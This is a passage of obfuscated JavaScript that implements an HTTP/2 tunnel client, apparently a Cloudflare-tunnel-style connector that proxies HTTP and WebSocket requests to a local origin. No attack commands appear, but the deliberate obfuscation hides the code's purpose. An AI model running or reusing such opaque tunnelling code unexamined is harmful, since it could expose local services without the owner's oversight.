            this[d8(0x65f)] = c, this['_drain']();
        }), a['on'](b['UWhQq'], () => {
            const d9 = d6;
            this['closed'] = !![], this[d9(0x3ca)]();
        }), a['on'](b[d6(0x6c7)], () => {
            const da = d6;
            this[da(0x206)] = !![], this[da(0x3ca)]();
        });
    }
    [a0aQ(0x3ca)]() {
        const db = a0aQ, a = {
                'wGOVy': function (b, c) {
                    return b !== c;
                },
                'QROkU': db(0x20d)
            };
        while (this[db(0x174)][db(0x54b)] > 0x0) {
            const b = this[db(0x174)][0x0];
            if (this[db(0x4ee)][db(0x54b)] >= b[db(0x1f4)]) {
                this[db(0x174)]['shift']();
                const c = this['buffer']['subarray'](0x0, b['need']);
                this['buffer'] = this[db(0x4ee)][db(0x74f)](b[db(0x1f4)]), b['resolve'](c);
            } else {
                if (a[db(0x718)](this[db(0x65f)], null))
                    this[db(0x174)][db(0x660)](), b[db(0x2b0)](this[db(0x65f)]);
                else {
                    if (this[db(0x206)])
                        this[db(0x174)][db(0x660)](), b[db(0x2b0)](new Error(a[db(0x349)]));
                    else
                        break;
                }
            }
        }
    }
    [a0aQ(0x2f7)](a) {
        const dc = a0aQ, b = {
                'NUobh': function (c, d) {
                    return c >= d;
                },
                'rPhzw': dc(0x20d)
            };
        if (this['errored'] !== null)
            return Promise[dc(0x2b0)](this[dc(0x65f)]);
        if (b[dc(0x324)](this['buffer'][dc(0x54b)], a)) {
            const c = this['buffer']['subarray'](0x0, a);
            return this['buffer'] = this[dc(0x4ee)]['subarray'](a), Promise['resolve'](c);
        }
        if (this[dc(0x206)])
            return Promise[dc(0x2b0)](new Error(b[dc(0x1ae)]));
        return new Promise((d, f) => {
            const dd = dc;
            this[dd(0x174)][dd(0x385)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[dd(0x3ca)]();
        });
    }
}
class a0au {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const de = a0aQ, l = {
                'KuyRX': '11|1|6|3|13|2|9|0|7|12|16|10|15|17|18|19|5|14|4|8',
                'PZINU': function (o, p) {
                    return o || p;
                }
            }, m = l[de(0x6d3)][de(0x696)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this['log'] = h;
                continue;
            case '1':
                this[de(0x420)] = new a0at(a);
                continue;
            case '2':
                this['tunnelId'] = f;
                continue;
            case '3':
                this[de(0x24a)] = c;
                continue;
            case '4':
                this[de(0x44c)] = ![];
                continue;
            case '5':
                this[de(0x343)] = null;
                continue;
            case '6':
                this[de(0x2c9)] = b;
                continue;
            case '7':
                this['tunnelUrl'] = i;
                continue;
            case '8':
                this[de(0x21d)] = [];
                continue;
            case '9':
                this[de(0x1b5)] = g;
                continue;
            case '10':
                this[de(0x1a1)] = new a0ac();
                continue;
            case '11':
                this['sock'] = a;
                continue;
            case '12':
                this[de(0x3ad)] = j;
                continue;
            case '13':
                this[de(0x72d)] = d;
                continue;
            case '14':
                this['stopped'] = ![];
                continue;
            case '15':
                this[de(0x6ca)] = 0xffff;
                continue;
            case '16':
                this[de(0x588)] = l[de(0x5bc)](k, { 'printed': ![] });
                continue;
            case '17':
                this[de(0x50f)] = new Map();
                continue;
            case '18':
                this[de(0x53d)] = a0a3;
                continue;
            case '19':
                this['streams'] = new Map();
                continue;
            }
            break;
        }
    }
    [a0aQ(0x196)](a, b, c, d = Buffer[a0aQ(0x381)](0x0)) {
        const df = a0aQ, f = {
                'VFdzC': function (h, i) {
                    return h > i;
                },
                'naPur': 'HTTP/2\x20frame\x20too\x20large',
                'YJoYI': function (h, i) {
                    return h & i;
                }
            };
        if (f[df(0x38c)](d['length'], 0xffffff))
            throw new Error(f['naPur']);
        const g = Buffer['alloc'](0x9);
        g[df(0x32b)](d[df(0x54b)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g['writeUInt32BE'](f[df(0x2e1)](c, 0x7fffffff), 0x5), this[df(0x51e)][df(0x336)](Buffer[df(0x562)]([
            g,
            d
        ]));
    }
    [a0aQ(0x203)](a, b, c = ![]) {
        const dg = a0aQ, d = {
                'Hyerx': function (h, i) {
                    return h(i);
                }
            }, f = d[dg(0x212)](a0af, b), g = 0x4 | (c ? 0x1 : 0x0);
        this[dg(0x196)](0x1, g, a, f);
    }
    [a0aQ(0x4aa)](a) {
        const dh = a0aQ, b = {
                'OQiEe': function (c, d) {
                    return c > d;
                }
            };
        if (b['OQiEe'](this['connectionWindow'], 0x0) && b[dh(0x659)](this['streamWindows']['get'](a) ?? 0xffff, 0x0))
            return Promise[dh(0x249)]();
        return new Promise(c => {
            const di = dh;
            this[di(0x21d)][di(0x385)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aQ(0x536)]() {
        const dj = a0aQ, a = {
                'DcOxd': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this['windowWaiters']) {
            const d = this[dj(0x50f)][dj(0x4b8)](c['streamId']) ?? 0xffff;
            a['DcOxd'](this[dj(0x6ca)], 0x0) && d > 0x0 ? c[dj(0x249)]() : b[dj(0x385)](c);
        }
        this[dj(0x21d)] = b;
    }
    [a0aQ(0x198)]() {
        const dk = a0aQ;
        for (const a of this[dk(0x21d)]) {
            a[dk(0x249)]();
        }
        this['windowWaiters'] = [];
    }
    async ['sendData'](a, b, c = ![]) {
        const dl = a0aQ, d = {
                'iGErM': function (h, i) {
                    return h >= i;
                },
                'hOwti': function (h, i) {
                    return h + i;
                },
                'zBowa': function (h, i) {
                    return h - i;
                },
                'JsfNV': function (h, i) {
                    return h < i;
                }
            }, f = b[dl(0x54b)];
        let g = 0x0;
        do {
            await this[dl(0x4aa)](a);
            if (this[dl(0x78b)])
                return;
            const h = this[dl(0x50f)]['get'](a) ?? 0xffff, i = Math['min'](f - g, this['connectionWindow'], h, this[dl(0x53d)]), j = c && d[dl(0x3e0)](g + i, f) ? 0x1 : 0x0, k = b['subarray'](g, d[dl(0x25f)](g, i));
            this[dl(0x6ca)] -= i, this[dl(0x50f)][dl(0x2c3)](a, d[dl(0x665)](h, i)), this['sendFrame'](0x0, j, a, k), g += i;
        } while (d[dl(0x64c)](g, f));
    }
    [a0aQ(0x4b2)](a, b) {
        const dm = a0aQ, c = {
                'ILayF': function (d, f) {
                    return d > f;
                },
                'eyvkv': function (d, f) {
                    return d & f;
                }
            };
        if (c[dm(0x2ea)](b, 0x0)) {
            const d = Buffer[dm(0x381)](0x4);
            d[dm(0x423)](c[dm(0x2d3)](b, 0x7fffffff), 0x0), this[dm(0x196)](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const dn = a0aQ, a = {
                'Frvkg': function (i, j) {
                    return i & j;
                }
            }, b = await this['reader'][dn(0x2f7)](0x9), c = b['readUIntBE'](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dn(0x2c2)](b[dn(0x36b)](0x5), 0x7fffffff), h = await this[dn(0x420)][dn(0x2f7)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aQ(0x3ed)](a, b, c) {
        const dp = a0aQ, d = {
                'jLtjR': function (g, h) {
                    return g & h;
                },
                'bWnAB': function (g, h) {
                    return g > h;
                },
                'HplJy': function (g, h) {
                    return g & h;
                },
                'HVKCn': function (g, h) {
                    return g & h;
                },
                'VeYGy': function (g, h) {
                    return g !== h;
                },
                'QzjsB': function (g, h) {
                    return g !== h;
                },
                'QNOBQ': 'expected\x20CONTINUATION\x20frame'
            };
        if (d['jLtjR'](a, 0x8)) {
            const g = c[0x0];
            c = c[dp(0x74f)](0x1);
            if (d[dp(0x280)](g, c[dp(0x54b)]))
                throw new Error(dp(0x657));
            c = g ? c[dp(0x74f)](0x0, c[dp(0x54b)] - g) : c;
        }
        d[dp(0x498)](a, 0x20) && (c = c[dp(0x74f)](0x5));
        const f = [c];
        while (!d[dp(0x487)](a, 0x4)) {
            const h = await this[dp(0x328)]();
            if (d['VeYGy'](h[0x0], 0x9) || d[dp(0x499)](h[0x2], b))
                throw new Error(d[dp(0x758)]);
            f['push'](h[0x3]), a = h[0x1];
        }
        return this[dp(0x1a1)]['decode'](Buffer[dp(0x562)](f));
    }
    [a0aQ(0x70b)](a) {
        const dq = a0aQ, b = {
                'CzOcN': function (c, d) {
                    return c !== d;
                },
                'rOZfQ': dq(0x415),
                'UlZuE': dq(0x2ac)
            };
        if (b[dq(0x222)](this[dq(0x343)], null))
            return;
        this[dq(0x343)] = new a0aw(this, a, this[dq(0x34d)]), this[dq(0x203)](a, [[
                b['rOZfQ'],
                b[dq(0x1fa)]
            ]]), this['control']['start'](this['accountTag'], this[dq(0x72d)], this[dq(0x4d6)], this[dq(0x1b5)]);
    }
    ['updateConfig'](a, b) {
        const dr = a0aQ, c = {
                'dMNtj': dr(0x5e6),
                'fHZEH': function (g, h, i) {
                    return g(h, i);
                },
                'tkknm': '200',
                'vNLNR': dr(0x464),
                'Oqswd': dr(0x6b1),
                'RIrZg': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[dr(0x65d)](b[dr(0x54b)] ? b[dr(0x6b0)](c['dMNtj']) : '{}'), h = c[dr(0x576)](parseInt, g[dr(0x611)], 0xa);
            !Number['isNaN'](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dr(0x6ef)](JSON[dr(0x542)]({ 'latestAppliedVersion': d }));
        this[dr(0x203)](a, [
            [
                dr(0x415),
                c['tkknm']
            ],
            [
                c[dr(0x2cf)],
                c[dr(0x739)]
            ],
            [
                dr(0x311),
                c[dr(0x172)](String, f[dr(0x54b)])
            ]
        ]), this[dr(0x38b)](a, f, !![]);
    }
    [a0aQ(0x6f1)](a, b) {
        const ds = a0aQ, c = { 'MthZk': ds(0x49b) };
        if (b[ds(0x734)] === c[ds(0x71f)]) {
            this[ds(0x511)](a, Buffer[ds(0x562)](b[ds(0x4ca)]));
            return;
        }
        if (b[ds(0x254)])
            return;
        if (b[ds(0x178)])
            return;
        b['finished'] = !![], this[ds(0x39f)](a, b)[ds(0x69b)](() => {
        });
    }
    async [a0aQ(0x39f)](a, b) {
        const dt = a0aQ, c = {
                'Amoto': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'BxQlO': function (d, f) {
                    return d === f;
                },
                'XegbW': dt(0x311),
                'fuXDY': dt(0x737),
                'CFmHc': dt(0x3d4),
                'eORMt': 'cf-proxy-',
                'ARFSE': function (d, f) {
                    return d === f;
                },
                'TRQOD': 'upgrade',
                'RYOAp': dt(0x274),
                'kzhfN': function (d, f) {
                    return d(f);
                },
                'aqret': 'content-type',
                'zxNBr': function (d, f) {
                    return d(f);
                },
                'Atalh': dt(0x415),
                'xpxHs': dt(0x390),
                'dRAUQ': 'cf-cloudflared-response-meta',
                'FGpUQ': function (d, f) {
                    return d + f;
                },
                'OZwvv': '\x20proxy\x20failed:\x20',
                'AeioE': '502'
            };
        try {
            const d = await c['Amoto'](a0az, this[dt(0x2c9)], b[dt(0x2e7)], b[dt(0x5ae)], b[dt(0x759)], Buffer[dt(0x562)](b[dt(0x4ca)])), f = [], g = [];
            for (const [k, l] of d[dt(0x759)]) {
                const m = k[dt(0x44e)]();
                c[dt(0x3f2)](m, c['XegbW']) && g[dt(0x385)]([
                    m,
                    l
                ]);
                const n = m[dt(0x214)](c['fuXDY']) || m[dt(0x214)](c[dt(0x4e9)]) || m[dt(0x214)](c[dt(0x763)]) || m[dt(0x214)](':');
                (!n || c[dt(0x3f2)](m, 'connection') || c['ARFSE'](m, c['TRQOD']) || m === c[dt(0x3f1)]) && f[dt(0x385)]([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === dt(0x464))) {
                const o = c['kzhfN'](a0ao, b[dt(0x5ae)]);
                o && f[dt(0x385)]([
                    c[dt(0x4bc)],
                    o
                ]);
            }
            const h = c['zxNBr'](a0as, f), i = c[dt(0x3f2)](d[dt(0x296)], 0x65) ? 0xc8 : d[dt(0x296)], j = [
                    [
                        c[dt(0x3d3)],
                        c['kzhfN'](String, i)
                    ],
                    ...g,
                    [
                        c[dt(0x6a9)],
                        h
                    ],
                    [
                        c[dt(0x2d7)],
                        dt(0x58d)
                    ]
                ];
            this[dt(0x203)](a, j);
            for await (const p of d['body']) {
                await this[dt(0x38b)](a, p, ![]);
            }
            await this[dt(0x38b)](a, Buffer[dt(0x381)](0x0), !![]);
        } catch (q) {
            this[dt(0x34d)][dt(0x379)](c[dt(0x69a)](c[dt(0x69a)](c[dt(0x69a)](dt(0x1c0), a), c[dt(0x345)]), q));
            try {
                this[dt(0x203)](a, [[
                        dt(0x415),
                        c[dt(0x2c1)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async ['run']() {
        const du = a0aQ, a = {
                'yKiup': du(0x694),
                'hvzSv': function (d, f) {
                    return d + f;
                },
                'oEXsz': function (d, f) {
                    return d === f;
                },
                'iQLqh': function (d, f) {
                    return d % f;
                },
                'RNMhx': 'invalid\x20SETTINGS\x20payload',
                'HFSEW': function (d, f) {
                    return d < f;
                },
                'SLVBz': function (d, f) {
                    return d === f;
                },
                'duaEW': function (d, f) {
                    return d >= f;
                },
                'aHGUy': function (d, f) {
                    return d <= f;
                },
                'KgdiS': function (d, f) {
                    return d & f;
                },
                'yRjjP': function (d, f) {
                    return d !== f;
                },
                'HMhps': function (d, f) {
                    return d === f;
                },
                'ZuuIQ': function (d, f) {
                    return d === f;
                }
            }, b = await this[du(0x420)][du(0x2f7)](0x18);
        if (!b['equals'](Buffer[du(0x6ef)](a[du(0x554)])))
            throw new Error(du(0x503));
        const c = Buffer[du(0x381)](0x6);
        c['writeUInt16BE'](0x3, 0x0), c[du(0x423)](0x64, 0x2), this['sendFrame'](0x4, 0x0, 0x0, c);
        this['showTunnel'] && !this['tunnelState'][du(0x245)] && (process[du(0x16f)][du(0x336)](a[du(0x740)](this[du(0x676)], '\x0a')), this[du(0x588)][du(0x245)] = !![]);
        try {
            while (!this[du(0x78b)]) {
                const [d, f, g, h] = await this['readFrame']();
                if (a[du(0x246)](d, 0x4)) {
                    if (!(f & 0x1)) {
                        if (a[du(0x354)](h[du(0x54b)], 0x6))
                            throw new Error(a[du(0x45f)]);
                        for (let i = 0x0; a[du(0x435)](i, h[du(0x54b)]); i += 0x6) {
                            const j = h[du(0x13e)](i), k = h[du(0x36b)](a['hvzSv'](i, 0x2));
                            if (j === 0x4) {
                                const l = k - 0xffff;
                                for (const m of this[du(0x50f)][du(0x4f9)]()) {
                                    this[du(0x50f)]['set'](m, Math[du(0x3af)](0x0, a[du(0x740)](this[du(0x50f)]['get'](m), l)));
                                }
                            } else
                                a['SLVBz'](j, 0x5) && a[du(0x1c1)](k, 0x4000) && a[du(0x63a)](k, 0xffffff) && (this[du(0x53d)] = k);
                        }
                        this[du(0x196)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[du(0x1e3)](d, 0x6)) {
                    !a[du(0x3d5)](f, 0x1) && this['sendFrame'](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (d === 0x8) {
                    if (a[du(0x3c4)](h[du(0x54b)], 0x4))
                        continue;
                    const n = h['readUInt32BE'](0x0) & 0x7fffffff;
                    a[du(0x246)](g, 0x0) ? this['connectionWindow'] += n : this['streamWindows'][du(0x2c3)](g, (this[du(0x50f)]['get'](g) ?? 0xffff) + n);
                    this['_notifyWindows']();
                    continue;
                }
                if (a[du(0x1e3)](d, 0x3)) {
                    this['streams'][du(0x56c)](g);
                    continue;
                }
                if (a[du(0x4c2)](d, 0x7))
                    break;
                if (d === 0x1) {
                    const o = await this[du(0x3ed)](f, g, h);
                    !this[du(0x50f)][du(0x116)](g) && this[du(0x50f)][du(0x2c3)](g, 0xffff);
                    this['handleHeaders'](g, f, o);
                    continue;
                }
                if (a[du(0x769)](d, 0x0)) {
                    this['handleData'](g, f, h);
                    continue;
                }
            }
        } finally {
            this[du(0x78b)] = !![], this[du(0x198)]();
            for (const p of this['streams'][du(0x23f)]()) {
                p[du(0x209)] && p['websocketProxy'][du(0x357)]();
            }
            try {
                this[du(0x51e)]['destroy']();
            } catch (q) {
            }
        }
    }
    ['handleHeaders'](a, b, c) {
        const dv = a0aQ, d = {
                'kWNAz': function (i, j) {
                    return i === j;
                },
                'yTjcz': function (i, j) {
                    return i & j;
                },
                'UzwVw': ':method',
                'UaDKU': dv(0x3f3),
                'aMSRF': dv(0x555),
                'KQjNr': function (i, j) {
                    return i === j;
                },
                'CprpL': dv(0x254),
                'OaHOI': dv(0x133),
                'trPWL': function (i, j) {
                    return i(j);
                },
                'Egyqc': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i[dv(0x214)](':') ? f[i] = j : f[i['toLowerCase']()] = j;
        }
        const g = (f[a0a1] || '')[dv(0x42d)]()['toLowerCase']();
        if (d[dv(0x695)](g, a0a2)) {
            this[dv(0x70b)](a);
            d[dv(0x6bc)](b, 0x1) && (this[dv(0x343)][dv(0x178)] = !![]);
            return;
        }
        const h = {
            'method': f[d[dv(0x540)]] || d['UaDKU'],
            'path': f[d[dv(0x405)]] || '/',
            'authority': f[dv(0x39a)] || '',
            'headers': c[dv(0x6ab)](([k]) => !k[dv(0x214)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[dv(0x408)](g, d[dv(0x1ad)]) || d[dv(0x695)]((f[d[dv(0x586)]] || '')[dv(0x44e)](), dv(0x254)),
            'ended': d['trPWL'](Boolean, d[dv(0x68c)](b, 0x1)),
            'finished': ![]
        };
        this[dv(0x224)][dv(0x2c3)](a, h);
        if (h['websocket'])
            h[dv(0x209)] = new a0av(this, a, h, this['origin'], this[dv(0x34d)]), h['websocketProxy'][dv(0x6da)]();
        else
            h[dv(0x3ff)] && this[dv(0x6f1)](a, h);
    }
    [a0aQ(0x48a)](a, b, c) {
        const dw = a0aQ, d = {
                'CgBvB': function (g, h) {
                    return g !== h;
                },
                'JGpSZ': function (g, h) {
                    return g & h;
                },
                'BZZDV': function (g, h) {
                    return g === h;
                },
                'QEqMC': function (g, h) {
                    return g !== h;
                },
                'YycXF': function (g, h) {
                    return g(h);
                },
                'jzEGb': function (g, h) {
                    return g & h;
                }
            };
        this['sendWindowUpdate'](0x0, c['length']), this['sendWindowUpdate'](a, c[dw(0x54b)]);
        if (d[dw(0x279)](this[dw(0x343)], null) && this[dw(0x343)][dw(0x672)] === a) {
            this[dw(0x343)][dw(0x5ec)](c);
            d['JGpSZ'](b, 0x1) && (this['control'][dw(0x178)] = !![]);
            return;
        }
        const f = this['streams']['get'](a);
        if (d['BZZDV'](f, undefined))
            return;
        if (d[dw(0x6ec)](f[dw(0x209)], undefined)) {
            f[dw(0x209)][dw(0x5ec)](c, d[dw(0x3c1)](Boolean, d[dw(0x392)](b, 0x1)));
            return;
        }
        c[dw(0x54b)] && f['body'][dw(0x385)](c), d[dw(0x392)](b, 0x1) && (f[dw(0x3ff)] = !![], this['requestFinished'](a, f));
    }
}
class a0av {
    constructor(a, b, c, d, f) {
        const dx = a0aQ, g = dx(0x463)['split']('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[dx(0x174)] = [];
                continue;
            case '1':
                this[dx(0x5a3)] = c;
                continue;
            case '2':
                this['streamId'] = b;
                continue;
            case '3':
                this[dx(0x2c9)] = d;
                continue;
            case '4':
                this[dx(0x666)] = a;
                continue;
            case '5':
                this[dx(0x51e)] = null;
                continue;
            case '6':
                this[dx(0x78b)] = ![];
                continue;
            case '7':
                this[dx(0x3c9)] = [];
                continue;
            case '8':
                this[dx(0x34d)] = f;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x6da)]() {
        const dy = a0aQ;
        this[dy(0x341)]()[dy(0x69b)](() => {
        });
    }
    [a0aQ(0x5ec)](a, b = ![]) {
        const dz = a0aQ;
        a['length'] && this[dz(0x3c9)][dz(0x385)](a), b && this[dz(0x3c9)]['push'](null), this[dz(0x61f)]();
    }
    [a0aQ(0x357)]() {
        const dA = a0aQ;
        if (this[dA(0x78b)])
            return;
        this[dA(0x78b)] = !![], this[dA(0x61f)]();
        if (this['sock'] !== null)
            try {
                this[dA(0x51e)]['destroy']();
            } catch (a) {
            }
    }
    [a0aQ(0x61f)]() {
        const dB = a0aQ, a = {
                'KwjqH': function (b) {
                    return b();
                }
            };
        for (const b of this[dB(0x174)]) {
            a['KwjqH'](b);
        }
        this[dB(0x174)] = [];
    }
    async [a0aQ(0x5ee)]() {
        const dC = a0aQ;
        while (!this[dC(0x78b)]) {
            if (this[dC(0x3c9)][dC(0x54b)])
                return this['queue'][dC(0x660)]();
            await new Promise(a => this[dC(0x174)]['push'](a));
        }
        return null;
    }
    async [a0aQ(0x341)]() {
        const dD = a0aQ, a = {
                'SYwmI': function (b, c) {
                    return b(c);
                },
                'jdoIx': function (b, c) {
                    return b === c;
                },
                'JzPqB': dD(0x311),
                'curAS': dD(0x737),
                'cQVns': dD(0x3d4),
                'JaUMg': function (b, c) {
                    return b === c;
                },
                'tGtAE': dD(0x734),
                'YhutV': dD(0x274),
                'EpOQu': function (b, c) {
                    return b === c;
                },
                'GCFBe': dD(0x415),
                'SHtyO': 'cf-cloudflared-response-headers',
                'DoxLG': dD(0x58d),
                'PKzLa': '\x20failed:\x20',
                'QaeJD': dD(0x485)
            };
        try {
            this[dD(0x51e)] = await a[dD(0x4c7)](a0ax, this[dD(0x2c9)]), this[dD(0x3be)]();
            const b = await a0aA(this['sock']), c = [], d = [];
            for (const [i, j] of b['headers']) {
                const k = i[dD(0x44e)]();
                a[dD(0x48d)](k, a[dD(0x5d7)]) && d['push']([
                    k,
                    j
                ]);
                const l = k[dD(0x214)](a['curAS']) || k[dD(0x214)](a[dD(0x2a3)]) || k[dD(0x214)](dD(0x492)) || k['startsWith'](':');
                (!l || a[dD(0x48d)](k, 'connection') || a[dD(0x15b)](k, a['tGtAE']) || a['JaUMg'](k, a['YhutV'])) && c[dD(0x385)]([
                    k,
                    j
                ]);
            }
            const f = a[dD(0x4c7)](a0as, c), g = a[dD(0x5af)](b[dD(0x296)], 0x65) ? 0xc8 : b[dD(0x296)], h = [
                    [
                        a['GCFBe'],
                        String(g)
                    ],
                    ...d,
                    [
                        a[dD(0x205)],
                        f
                    ],
                    [
                        dD(0x19c),
                        a['DoxLG']
                    ]
                ];
            this[dD(0x666)][dD(0x203)](this[dD(0x672)], h), this['writeToOrigin']()[dD(0x69b)](() => {
            }), await this[dD(0x1e4)](b[dD(0x30f)]);
        } catch (m) {
            this['log'][dD(0x379)](dD(0x522) + this[dD(0x672)] + a[dD(0x210)] + m);
            try {
                this[dD(0x666)]['sendHeaders'](this['streamId'], [[
                        a[dD(0x417)],
                        a[dD(0x2f6)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[dD(0x357)]();
        }
    }
    async [a0aQ(0x1e4)](a) {
        const dE = a0aQ;
        a[dE(0x54b)] && await this[dE(0x666)][dE(0x38b)](this[dE(0x672)], a, ![]);
        for await (const b of this['sock']) {
            if (this[dE(0x78b)])
                break;
            await this[dE(0x666)][dE(0x38b)](this[dE(0x672)], b, ![]);
        }
        !this[dE(0x78b)] && await this[dE(0x666)]['sendData'](this[dE(0x672)], Buffer['alloc'](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const dF = a0aQ, a = {
                'tsyjj': function (b, c) {
                    return b === c;
                }
            };
        while (!this[dF(0x78b)]) {
            const b = await this[dF(0x5ee)]();
            if (a[dF(0x3e8)](b, null))
                return;
            try {
                this['sock'][dF(0x336)](b);
            } catch (c) {
                this['stopped'] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const dG = a0aQ, a = {
                'jQhcC': function (i, j) {
                    return i + j;
                },
                'gCdTw': function (i, j) {
                    return i === j;
                },
                'XjNlD': dG(0x592),
                'GuLoI': dG(0x666),
                'JAfos': function (i, j) {
                    return i === j;
                },
                'OKAkN': dG(0x734),
                'tZBrx': dG(0x311),
                'jmmzP': 'transfer-encoding',
                'YRgJs': function (i, j) {
                    return i === j;
                },
                'DfOBF': dG(0x462),
                'wREvI': dG(0x4bf),
                'zZgrM': dG(0x62a),
                'XpWkF': 'Origin:\x20https://',
                'PtTJo': dG(0x475),
                'fvtgH': dG(0x1fc),
                'avckc': 'Sec-WebSocket-Version:\x2013',
                'TdVig': dG(0x323),
                'JKTxE': dG(0x424)
            }, b = new URL(this[dG(0x2c9)]), c = this[dG(0x5a3)]['path'][dG(0x214)]('/') ? this[dG(0x5a3)]['path'] : a[dG(0x73e)]('/', this[dG(0x5a3)][dG(0x5ae)]), d = ['GET\x20' + c + dG(0x148)];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request'][dG(0x759)]) {
            const k = i[dG(0x44e)]();
            if (a[dG(0x18f)](k, a[dG(0x1d7)]) || k === a[dG(0x76c)] || a[dG(0x12d)](k, a[dG(0x72a)]) || k === a[dG(0x62f)] || a['gCdTw'](k, a[dG(0x2d1)]))
                continue;
            if (a[dG(0x326)](k, a[dG(0x2f8)]))
                f = !![];
            else {
                if (a[dG(0x18f)](k, a[dG(0x70e)]))
                    g = !![];
                else
                    k === dG(0x2c9) && (h = !![]);
            }
            d[dG(0x385)](a[dG(0x73e)](a[dG(0x73e)](i, ':\x20'), j));
        }
        d[dG(0x385)](a['jQhcC'](a['zZgrM'], b[dG(0x592)])), !h && this[dG(0x5a3)][dG(0x2c7)] && d['push'](a[dG(0x73e)](a[dG(0x23d)], this[dG(0x5a3)]['authority'])), !f && d[dG(0x385)](a[dG(0x73e)](a[dG(0x327)], a0k[dG(0x29c)](0x10)[dG(0x6b0)](a[dG(0x673)]))), !g && d[dG(0x385)](a['avckc']), d[dG(0x385)](a[dG(0x52a)]), d[dG(0x385)](dG(0x2e0)), this['sock'][dG(0x336)](Buffer[dG(0x6ef)](d[dG(0x6e2)]('\x0d\x0a') + dG(0x3d0), a[dG(0x29f)]));
    }
}
class a0aw {
    constructor(a, b, c) {
        const dH = a0aQ, d = dH(0x61d)['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[dH(0x178)] = ![];
                continue;
            case '1':
                this['log'] = c;
                continue;
            case '2':
                this['connection'] = a;
                continue;
            case '3':
                this['buffer'] = Buffer[dH(0x381)](0x0);
                continue;
            case '4':
                this[dH(0x672)] = b;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x6da)](a, b, c, d) {
        const dI = a0aQ;
        this[dI(0x666)][dI(0x38b)](this[dI(0x672)], a0ah(0x0), ![]), this[dI(0x666)][dI(0x38b)](this[dI(0x672)], a0ai(0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aQ(0x5ec)](a) {
        const dJ = a0aQ, b = {
                'tMXSC': function (f, g) {
                    return f(g);
                },
                'VzyIu': function (f, g) {
                    return f + g;
                },
                'vdLGO': dJ(0x338),
                'ZwOkx': dJ(0x6a6),
                'EDkcF': 'unknown\x20error',
                'FhWeL': function (f, g) {
                    return f + g;
                }
            };
        this[dJ(0x4ee)] = this[dJ(0x4ee)][dJ(0x54b)] ? Buffer[dJ(0x562)]([
            this[dJ(0x4ee)],
            a
        ]) : a;
        let c, d;
        [c, d] = b['tMXSC'](a0aj, this['buffer']), this[dJ(0x4ee)] = d;
        for (const f of c) {
            try {
                const g = a0am(f);
                g['ok'] ? (this[dJ(0x34d)][dJ(0x6c8)](b[dJ(0x73a)](b[dJ(0x716)], g[dJ(0x1e1)] || dJ(0x215))), this[dJ(0x666)][dJ(0x44c)] = !![]) : this[dJ(0x34d)][dJ(0x379)](b[dJ(0x73a)](b[dJ(0x292)], g[dJ(0x3bf)] || b[dJ(0x12e)]));
            } catch (h) {
                this['log'][dJ(0x66e)](b[dJ(0x71d)](dJ(0x22a), h));
            }
        }
    }
}
function a0ax(a) {
    const dK = a0aQ, b = {
            'NFTBN': dK(0x3bf),
            'bOFHd': function (c, d, f) {
                return c(d, f);
            },
            'YkyBp': 'secureConnect',
            'oWJZE': function (c, d) {
                return c(d);
            },
            'NaVOm': dK(0x272),
            'IWMDp': dK(0x2eb),
            'dmVUK': dK(0x64d),
            'zXXxM': function (c, d) {
                return c === d;
            }
        };
    return new Promise((c, d) => {
        const dM = dK, f = {
                'tMHhQ': b['NFTBN'],
                'PqOdQ': function (n, o) {
                    return n(o);
                },
                'ggARo': function (n, o, p) {
                    const dL = a0b;
                    return b[dL(0x300)](n, o, p);
                },
                'rjhKy': function (n, o, p) {
                    return b['bOFHd'](n, o, p);
                },
                'TQpXV': b[dM(0x634)]
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[dM(0x729)](d, new Error(b['NaVOm']));
            return;
        }
        if (![
                b[dM(0x6b8)],
                b[dM(0x291)]
            ][dM(0x374)](g[dM(0x410)]) || !g[dM(0x3fe)]) {
            b[dM(0x729)](d, new Error(b[dM(0x1c5)]));
            return;
        }
        const h = b[dM(0x69c)](g[dM(0x410)], b[dM(0x291)]), i = g[dM(0x2bb)] || (h ? 0x1bb : 0x50), j = a0i[dM(0x766)]({
                'host': g[dM(0x3fe)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const dN = dM;
                if (k)
                    return;
                k = !![], j['removeListener'](f[dN(0x373)], m), j[dN(0x6a0)](0x0), f[dN(0x702)](o, p);
            }, m = o => {
                !k && l(d, o);
            };
        j['on'](b[dM(0x118)], m), j[dM(0x6a0)](0x7530, () => j[dM(0x371)](new Error(dM(0x33a)))), j['on'](dM(0x766), () => {
            const dP = dM, o = {
                    'fRzre': function (q, r, s) {
                        const dO = a0b;
                        return f[dO(0x221)](q, r, s);
                    }
                };
            if (!h) {
                f[dP(0x3b4)](l, c, j);
                return;
            }
            const p = a0j['connect']({
                'socket': j,
                'servername': g[dP(0x3fe)]
            });
            p['on'](f['tMHhQ'], q => {
                !k && l(d, q);
